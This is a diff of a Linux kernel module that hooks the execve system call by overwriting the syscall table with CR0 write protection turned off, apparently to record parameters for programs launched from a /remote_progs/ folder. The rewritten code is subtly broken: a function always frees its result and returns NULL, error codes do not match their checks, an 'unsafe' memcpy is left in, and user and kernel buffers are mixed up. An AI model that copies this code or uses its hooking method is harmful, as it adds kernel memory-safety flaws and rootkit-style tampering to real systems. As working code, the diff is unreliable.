@@ -1,6 +1,11 @@
 #include "rscaller.h"
 
 
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h> 
+
 #include <linux/module.h>
 #include <linux/sched.h>
 #include <linux/mm.h>
@@ -20,8 +25,7 @@ static t_syscall orig_syscall;
 
 #define REMOTE_PROGS_FOLDER "/remote_progs/"
 
-unsigned long *
-get_syscall_table(void)
+unsigned long * get_syscall_table(void)
 {
 	unsigned long *syscall_table;
 	
@@ -31,8 +35,7 @@ get_syscall_table(void)
 
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static inline void
-write_cr0_forced(unsigned long val)
+static inline void write_cr0_forced(unsigned long val)
 {
 	unsigned long __force_order;
 
@@ -42,8 +45,7 @@ write_cr0_forced(unsigned long val)
 }
 #endif
 
-static inline void
-protect_memory(void)
+static inline void smap_write_enable(void)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -58,8 +60,7 @@ protect_memory(void)
 #endif
 }
 
-static inline void
-unprotect_memory(void)
+static inline void smap_write_disable(void)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -73,44 +74,85 @@ unprotect_memory(void)
 #endif
 }
 
+static inline void smap_rw_disable(void)
+{
+	stac();
+}
+
+static inline void smap_rw_enable(void)
+{
+	clac();
+}
+
+// void fetch_param_variant(SyscallParam *src, int param_type, void **param, size_t *param_size) {
+
 // TODO: separately handle userspace char buffers
-int save_syscall_param(ParamBuffer *buf, const void *param, const SyscallSignature *signature, int param_idx)
+int save_syscall_param(SyscallParam *buf, long param, int param_idx, const SyscallSignature *signature)
 {
 	void* inner_buf;
-	void* src;
 	void* src_kernel;
 	bool is_ptr = signature->params_meta[param_idx].is_ptr;
 	int type_variant = signature->params_meta[param_idx].type;
 	size_t param_size = signature->params_meta[param_idx].size;
 
-
-	fetch_param_variant(&buf->param, type_variant, &inner_buf, &param_size);
+	fetch_param_variant(buf, type_variant, &inner_buf, &param_size);
 
 	// Here we handle all pointers except char buffers
 	// param_size is taken from real size of struct
 	if (is_ptr) {
 		// pr_info("Trying to allocate %d bytes\n", param_size);
-		src_kernel = kvmalloc(param_size + 1, GFP_KERNEL);
+        src_kernel = kvmalloc(param_size, GFP_KERNEL);
+        if (!src_kernel) {
+            pr_err("Failed to allocate temp buf for syscall");
+            return -ENOMEM; // it's good practice to return a proper error code
+        }
 
-		if (!src_kernel) {
-			pr_err("Failed to allocate temp buf for syscall");
-			return -1;
-		}
+        // Copy the data from user space to the kernel buffer
+        if (copy_from_user(src_kernel, (const void __user *)inner_buf, param_size)) {
+            kvfree(src_kernel); // Free the allocated buffer in case of failure
+            pr_err("Failed to copy data from user space");
+            return -EFAULT; // Return an error if copy fails
+        }
 
-		copy_from_user(src, (const void __user *)inner_buf, param_size);
-	}
+        // Now use src_kernel as the source for memcpy
+        memcpy(inner_buf, src_kernel, param_size);
+        kvfree(src_kernel); // Free the allocated buffer after copying
+    } 
 	else {
-		src = (void*)param;
+        memcpy(inner_buf, (void *)param, param_size); // Unsafe, we should ensure 'param' is valid!
 	}
 
-	// TODO: avoid double copying
-	memcpy(inner_buf, src, param_size);
-
-	if (is_ptr) {
-		kfree(src);
-	}
 
 	return 0;
+}
+
+Syscall* save_syscall(unsigned long *params, const SyscallSignature *signature) {
+	Syscall* syscall;
+	int ret;
+
+	syscall = kvmalloc(sizeof(Syscall), GFP_KERNEL);
+	if (syscall == NULL) {
+		pr_err("Failed to alloc syscall buf");
+		return NULL;
+	}
+
+	smap_rw_disable();
+	for(int i = 0; i < signature->n_params; i++) {
+
+		pr_info("Trying to save param %d", i);
+		ret = save_syscall_param(&syscall->param_bufs[i], params[i], i, signature);
+		if (ret == -1) {
+			pr_err("Failed to save syscall params");
+			return NULL;
+		}
+	}
+	smap_rw_enable();
+
+	pr_info("Saved syscall params");
+
+err:
+	kfree(syscall);
+	return NULL;
 }
 
 
@@ -146,8 +188,7 @@ char *get_current_binary_path(void)
 }
 
 
-bool 
-filter_binary(void) {
+bool filter_binary(void) {
 	bool is_filtered;
 	char  *binary = get_current_binary_path();
 
@@ -165,12 +206,14 @@ filter_binary(void) {
 	return is_filtered;
 }
 
-asmlinkage int
-hooked_syscall(const struct pt_regs *pt_regs)
+// TODO: add codegen or macro for syscall
+asmlinkage int hooked_syscall(const struct pt_regs *pt_regs)
 {
 	int ret;
-	SyscallSignature signature = signature__x64_sys_execve;		
-	ParamBuffer saved_params[6];
+	SyscallSignature signature;
+	Syscall *syscall;	
+	memcpy(&signature, &signature__x64_sys_execve, sizeof(signature__x64_sys_execve));
+	
 	unsigned long params[6] = {
 		pt_regs->bx,
 		pt_regs->cx,
@@ -180,28 +223,22 @@ hooked_syscall(const struct pt_regs *pt_regs)
 		pt_regs->bp,
 	};
 
+	// Binary is outside of remote_progs folder
 	if (filter_binary()) {
 		return orig_syscall(pt_regs);
 	}
 
 
-	for(int i = 0; i < signature.n_params; i++) {
-		ret = save_syscall_param(&saved_params[i], &params[i], &signature, i);
-
-		if (ret == -1) {
-			pr_err("Failed to save syscall params");
-			return orig_syscall(pt_regs);
-		}
-	}
-
+	smap_write_disable();
+	syscall = save_syscall((unsigned long*)&params, &signature);
+	smap_write_enable();
 
 	return orig_syscall(pt_regs);
 }
 
 int syscall_num = __NR_execve;
 
-static int __init
-rscaller_init(void)
+static int __init rscaller_init(void)
 {
 	__sys_call_table = get_syscall_table();
 	if (!__sys_call_table)
@@ -218,23 +255,22 @@ rscaller_init(void)
 
 	orig_syscall = (t_syscall)__sys_call_table[syscall_num];
 
-	unprotect_memory();
+	smap_write_disable();
 
 	__sys_call_table[syscall_num] = (unsigned long) hooked_syscall;
 
-	protect_memory();
+	smap_write_enable();
 
 	return 0;
 }
 
-static void __exit
-rscaller_cleanup(void)
+static void __exit rscaller_cleanup(void)
 {
-	unprotect_memory();
+	smap_write_disable();
 
 	__sys_call_table[syscall_num] = (unsigned long) orig_syscall;
 
-	protect_memory();
+	smap_write_enable();
 }
 
 module_init(rscaller_init);
